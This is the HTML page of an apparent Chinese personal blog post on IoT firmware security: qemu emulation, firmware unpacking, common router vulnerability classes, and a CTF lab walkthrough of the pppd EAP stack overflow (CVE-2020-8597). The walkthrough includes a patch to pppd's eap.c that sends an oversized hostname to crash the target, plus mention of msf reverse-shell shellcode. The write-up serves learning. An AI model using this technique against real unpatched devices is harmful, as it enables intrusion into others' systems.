@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shuwen.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shuwen.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="IOT 安全实战资料收集整合：https:&#x2F;&#x2F;zybuluo.com&#x2F;H4l0&#x2F;note&#x2F;1524758 一、固件安全概述​    固件指设备内部保存的设备 “驱动程序”，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。 ​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设">
+<meta property="og:type" content="article">
+<meta property="og:title" content="固件iot基础">
+<meta property="og:url" content="http://yoursite.com/2020/10/22/01-08-undefined/index.html">
+<meta property="og:site_name" content="Shuwen&#39;s blog">
+<meta property="og:description" content="IOT 安全实战资料收集整合：https:&#x2F;&#x2F;zybuluo.com&#x2F;H4l0&#x2F;note&#x2F;1524758 一、固件安全概述​    固件指设备内部保存的设备 “驱动程序”，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。 ​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200829170912807.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200829174231769.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200829174236510.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200830121124694.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200830121439048.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200830122145171.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200830154226602.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200830015127901.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200829204006754.png">
+<meta property="article:published_time" content="2020-10-21T17:08:48.000Z">
+<meta property="article:modified_time" content="2021-04-20T08:57:54.182Z">
+<meta property="article:author" content="Shuwen">
+<meta property="article:tag" content="基础知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/10/22/01-08-undefined/image-20200829170912807.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/10/22/01-08-undefined/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>固件iot基础 | Shuwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Shuwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">生活 & 学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/01-08-undefined/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/shuwen.jpg">
+      <meta itemprop="name" content="Shuwen">
+      <meta itemprop="description" content="做有意思的事，有意思地做事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shuwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          固件iot基础
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-22 01:08:48" itemprop="dateCreated datePublished" datetime="2020-10-22T01:08:48+08:00">2020-10-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-20 16:57:54" itemprop="dateModified" datetime="2021-04-20T16:57:54+08:00">2021-04-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/iot/" itemprop="url" rel="index"><span itemprop="name">iot</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
+<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
+<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
+<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200829170912807.png" alt="image-20200829170912807"></p>
+<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
+<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
+<ul>
+<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
+<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
+</ul>
+<p>使用：</p>
+<ul>
+<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
+<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
+</ul>
+<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
+<ul>
+<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/22/01-08-undefined/image-20200829174231769.png" alt="image-20200829174231769"></p>
+<ul>
+<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/22/01-08-undefined/image-20200829174236510.png" alt="image-20200829174236510"></p>
+<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
+<ol>
+<li>nday cve 漏洞分析和利用；</li>
+<li>mips 指令集栈溢出漏洞的调试和利用</li>
+</ol>
+<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
+<p>漏洞点：</p>
+<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200830121124694.png" alt="image-20200830121124694"></p>
+<p>操作步骤：</p>
+<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
+<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200830121439048.png" alt="image-20200830121439048"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+<p>（2）编辑<code>etc/inittab</code></p>
+<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
+<p>（3）修改<code>start.sh</code>文件</p>
+<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
+<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
+<p>（5）重新打包<code>rootfs.img</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+<p>（6）运行</p>
+<p><code>./start.sh</code></p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200830122145171.png" alt="image-20200830122145171"></p>
+<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
+<p>再打开一个新的窗口</p>
+<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
+<p>接着</p>
+<p>（1）下载ppp的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
+<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
+<p>修改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
+<p>（3）编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
+<p>（4）在本地机器运行patched <code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
+<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200830154226602.png" alt="image-20200830154226602"></p>
+<p>获取flag：</p>
+<p>方法一：</p>
+<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
+<p>方法二：</p>
+<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
+<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
+<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
+<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
+<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
+<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
+<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
+<p>考点：</p>
+<ol>
+<li>mips 堆溢出利用；</li>
+<li>uClibc 堆管理机制。 </li>
+</ol>
+<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200830015127901.png" alt="image-20200830015127901"></p>
+<p>DLINK DIR-815 路由器前台栈溢出</p>
+<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
+<ul>
+<li>DLINK DIR-859 upnp 协议命令注入</li>
+<li>tplink sr20 路由器命令注入</li>
+<li>Draytek Vigor2960 前台登录处栈溢出</li>
+</ul>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
+<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
+<p>TPLINK WR841n 路由器后台栈溢出</p>
+<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
+<p>命令注入</p>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
+<hr>
+<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
+<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
+<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
+<p><img src="/2020/10/22/01-08-undefined/image-20200829204006754.png" alt="image-20200829204006754"></p>
+<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
+<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Q：如果阅读本文需要付费，你是否愿意为此支付1元？</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="Shuwen 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Shuwen 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Shuwen
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/10/22/01-08-undefined/" title="固件iot基础">http://yoursite.com/2020/10/22/01-08-undefined/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag"># 基础知识</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/22/00-32-undefined/" rel="prev" title="ret2usr">
+      <i class="fa fa-chevron-left"></i> ret2usr
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/22/01-17-undefined/" rel="next" title="embedded(未完成)">
+      embedded(未完成) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、固件安全概述"><span class="nav-number">1.</span> <span class="nav-text">一、固件安全概述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#固件结构特点"><span class="nav-number">1.1.</span> <span class="nav-text">固件结构特点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、固件模拟概述"><span class="nav-number">2.</span> <span class="nav-text">二、固件模拟概述</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vmware-和-qemu-的区别"><span class="nav-number">2.1.</span> <span class="nav-text">vmware 和 qemu 的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#qemu-固件模拟"><span class="nav-number">2.2.</span> <span class="nav-text">qemu 固件模拟</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、MISP-PWN-amp-ARM-PWN"><span class="nav-number">3.</span> <span class="nav-text">三、MISP PWN &amp; ARM PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1）ctf-中的-mips-pwn"><span class="nav-number">3.1.</span> <span class="nav-text">1）ctf 中的 mips pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" 